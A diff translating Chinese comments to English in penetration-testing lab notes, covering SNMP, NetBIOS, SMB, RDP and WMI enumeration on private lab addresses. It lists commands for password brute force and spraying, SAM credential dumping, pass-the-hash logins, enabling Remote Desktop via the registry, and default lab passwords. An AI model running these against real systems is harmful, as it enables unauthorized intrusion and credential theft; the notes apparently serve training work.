@@ -15,35 +15,35 @@ WordPress             192.168.0.24
 ---
 
 # SNMP
-SNMP 是一種用於管理和監視網絡設備的協議，通常在路由器、交換機、伺服器等設備上使用，UDP161
+SNMP (Simple Network Management Protocol) is used for managing and monitoring network devices, commonly on routers, switches, servers, etc. Port: UDP 161
 ```bash
 sudo nmap 192.168.0.* --open -p161 -sU -oG - | grep Up | cut -d ' ' -f2 > snmp_list
 
 sudo nmap 192.168.0.1 --open -p161 
-# 觀察:
-# 上面掃描的時候明明192.168.0.1有開snmp
-# 怎麼單獨掃就沒有了呢
+# Observation:
+# In the scan above, 192.168.0.1 clearly had SNMP open
+# Why does it not show up when scanned individually?
 
 sudo nmap 192.168.0.1 --open -p161 -sU --reason
-# 觀察:
-# nmap若不加-sU會將Reason : no-response當作沒有開啟
+# Observation:
+# If Nmap doesn't include -sU, it treats "Reason: no-response" as closed/not open
 
 # Scan ip_list
 sudo nmap -sU -p161 --open -n -Pn -iL ip_list.txt -oG > snmp_list
 ```
 snmp-check
 ```bash
-# 檢查snmp配置和安全性的工具
+# Tool to inspect SNMP configuration and security
 snmp-check 192.168.0.20
 
 snmp-check 192.168.0.22
 ```
-onesixtyone SNMP狀態確認器 
+onesixtyone SNMP Status Scanner 
 ```bash
-# onesixtyone 通常用於查找社群字串（community strings）或爆破 SNMP v1/v2 的密碼
+# onesixtyone is commonly used to find community strings or brute-force SNMP v1/v2 passwords
 
-# 嘗試使用 "public" 作為 Coummunty Strings 來訪問目標設備的 SNMP 服務，以收集有關設備的信息
-onesixtyone -i snmp_list public # 蒐集主機資訊
+# Attempt to use "public" as the Community String to access target device SNMP service and gather device information
+onesixtyone -i snmp_list public # Gather host information
 ```
 Nmap Script - SNMP Account
 ```bash
@@ -55,21 +55,21 @@ sudo nmap 192.168.0.20 -p161 -sU -n -Pn --script snmp-win32-users
 Introduction
 ```bash
 # port
-UDP 137 # 名稱解析
-UDP 138 # 服務宣告
+UDP 137 # Name resolution
+UDP 138 # Datagram service / service announcements
 
-一般來說網路架構的底層是Socket (IP:PORT)
+Generally, modern network communication is built on Sockets (IP:PORT)
 
 
 # NetBIOS 
-微軟之前有一套自己的網路架構底層為NetBIOS
-並透過NetBIOS Name來確定唯一性，16 Char(1-15:Name、16:ServiceID)
-NetBIOS 是指 Network Basic Input/Output System，是一個作業系統級的API
+Microsoft previously used its own networking architecture based on NetBIOS.
+It identifies systems uniquely via NetBIOS Name: 16 characters (chars 1-15: Name, char 16: Service ID).
+NetBIOS stands for Network Basic Input/Output System, an OS-level API.
 
 # NetBT (NetBIOS over TCP/IP)
-NetBT能讓舊有運用NetBIOS API的軟體，能夠在現代TCP/IP網路上繼續運作，即NetBIOS over TCP/IP
-NetBT 需要每台計算機有一個唯一的 NetBIOS 名稱，這通常就是該計算機的Computer Name
-不過這個架構在Win2000就已經結束
+NetBT allows legacy software using NetBIOS APIs to continue working over modern TCP/IP networks (NetBIOS over TCP/IP).
+NetBT requires each computer to have a unique NetBIOS name, typically matching the Computer Name.
+However, native reliance on this architecture largely ended around Windows 2000.
 ```
 Detection Windows
 ```bash
@@ -77,19 +77,19 @@ Detection Windows
 nbtstat -n                # Local Computer Name
 SERVER2019     <00>       # service.msc -> Workstation service
 SERVER2019     <20>       # service.msc -> Server service
-# <00> - 一般表示工作站服務名稱
-# <03> - 一般表示信使服務名稱
-# <20> - 一般表示文件服務名稱（Server service）
+# <00> - Workstation Service name
+# <03> - Messenger Service name
+# <20> - File/Server Service name (Server service)
 #         [NetBIOS name of the computer]
-# <1B> - 一般表示主域控制器名稱（Domain master browser）
-# <1C> - 一般表示域控制器組名
+# <1B> - Domain Master Browser name
+# <1C> - Domain Controller group name
 #        [NetBIOS domain name for the machine]
-# <1E> - 一般表示瀏覽服務選舉名稱
-# <1D> - 一般表示本地主瀏覽器名稱（Local master browser）
-# <1F> - 一般表示 NetDDE 服務名稱
+# <1E> - Browser Service Election name
+# <1D> - Local Master Browser name
+# <1F> - NetDDE Service name
 
-nbtstat -a $ComputerName  # 指定host的NetBIOS資訊
-nbtstat -A $IP            # Remote Host的NetBIOS資訊
+nbtstat -a $ComputerName  # NetBIOS info for specified host
+nbtstat -A $IP            # NetBIOS info for remote host by IP
 ping $ComputerName
 nbtstat -c                # Cache Record
 ```
@@ -120,7 +120,7 @@ nmblookup -A $IP
 ```
 Access Linux
 ```bash
-smbclient -N -L 192.168.0.22  #匿名登入並列舉
+smbclient -N -L 192.168.0.22  # Anonymous login and list shares
 smbclient -U 'Administrator%Pa$$w0rd' //192.168.0.22/c$
 smbclient -U 'Administrator%Pa$$w0rd' //192.168.0.22/c$ -c 'dir'
 ```
@@ -136,14 +136,14 @@ TCP SMB - 445
 
 SMB version
 V1 : 
-V2 : 加入Digital Signature，不再發生中間人攻擊
-V3 : 加入Encryption，不怕被側錄封包
+V2 : Added Digital Signatures, preventing MITM attacks
+V3 : Added Encryption, protecting against packet sniffing
 ```
 Detect
 ```bash
 # port
 TCP 139,445
-# 差別在於139還是走NetBT 445是真的Socket
+# Difference: port 139 runs over NetBT; port 445 runs directly over TCP (raw socket)
 
 nmap -iL -p445 -sVC
 nmap --script smb-os-discovery,smb-protocols
@@ -153,15 +153,15 @@ nmap -iL smb_list.txt -n -Pn -p445 -sV --script smb-os-discovery,smb-protocols
 ```
 Crack Password
 ```bash
-# crackmapexec高效SMB爆破工具
+# CrackMapExec - high-performance SMB brute-force and post-exploitation tool
 # Install
 python3 -m pip list | grep impacket # Impacket Version > 0.9.23
 python3 -m pip install --upgrade impacket
 
-# 密碼爆破
+# Password brute force
 crackmapexec smb ip_smb -u administrator -p $passwordlist | grep 'Pwn3d!'
 
-# 密碼噴灑
+# Password spraying
 crackmapexec smb 192.168.0.7 -u userlist.txt -p $password --continue-on-success
 ```
 Access
@@ -179,7 +179,7 @@ winexe -U 'administrator%Pa$$w0rd' //192.168.0.22 cmd.exe
 # Hash Access
 # Get User + SAM Hash
 secretsdump.py 'administrator:Pa$$w0rd'@192.168.0.7
-# pth-winexe 在2016後的機器成功率其實不高
+# pth-winexe has a lower success rate on Windows Server 2016 and newer
 pth-winexe –U 'Username%<LM_hash:NTLM_hash>' //<IP> cmd.exe
 psexec.py 'administrator'@192.168.0.22 -hashes :$hash
 
@@ -211,18 +211,18 @@ hydra rdp://192.168.0.7 -L Username.txt -P Password.txt
 sudo apt install -y crowbar 
 git clone https://github.com/galkan/crowbar
 apt-get install -y nmap openvpn freerdp-x11 vncviewer
-# -v: 輸出詳細資訊
+# -v: Verbose output
 crowbar [-v] -b rdp -s <IP/CIDR> -u user -c password
 crowbar [-v] -b rdp -s <IP/CIDR> -U Users.txt -C Passwords.txt
 crowbar -b rdp -s 192.168.0.7/32 -u administrator -C Passwords.txt
 
-tail crowbar.log # 進度 因為crowbar預設再背景跑 
+tail crowbar.log # Check progress (crowbar runs in background by default)
 ```
 xfreerdp
 ```bash
 # Environment
 sudo dpkg -l | grep freerdp
-# 以下全部都要2.3version以上
+# The following all require version 2.3 or higher
 freerdp2-x11
 libfreerdp2-2
 libfreerdp-client2-2
@@ -238,9 +238,9 @@ xfreerdp /size:90% /v:<rdp_IP> /u:<user> /pth:<ntlm_hash>
 ```
 reg
 ```bash
-# Windows遠桌開關
+# Windows Remote Desktop toggle
 
-# 1為關  0為開
+# 1 = Disabled, 0 = Enabled
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ```
 
@@ -281,7 +281,7 @@ python3 wmiexec.py administrator:1234567@172.25.30.55
 
 # OWASPBWA 
 ```bash
-# 如果看到題目的靶機是這個平臺的，很常用這組密碼，可以試試看
+# If the target machine uses this platform, this default password is very commonly used; try it:
 # https://code.google.com/archive/p/owaspbwa/wikis/UserGuide.wiki
 Pa$$w0rd123
 ```
